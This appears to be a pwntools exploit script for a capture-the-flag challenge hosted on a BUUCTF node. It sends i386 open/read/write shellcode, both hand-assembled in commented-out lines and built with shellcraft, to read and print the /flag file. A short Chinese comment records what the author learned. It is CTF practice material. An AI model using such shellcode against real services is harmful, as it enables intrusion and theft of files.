from pwn import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

io = remote('node4.buuoj.cn', 29631)

# TODO: 第一次碰见这种限制特定系统调用、需要自己手写shellcode的场景，学到了

# 自己写汇编代码
# shellcode = asm('push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80')
# shellcode+=asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80')
# shellcode+=asm('mov eax,0x4;mov ebx,0x1;int 0x80')
# io.send(shellcode)

# 调用shellcraft接口
shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('eax','esp',100)
shellcode += shellcraft.write(1,'esp',100)
io.send(asm(shellcode))

io.interactive()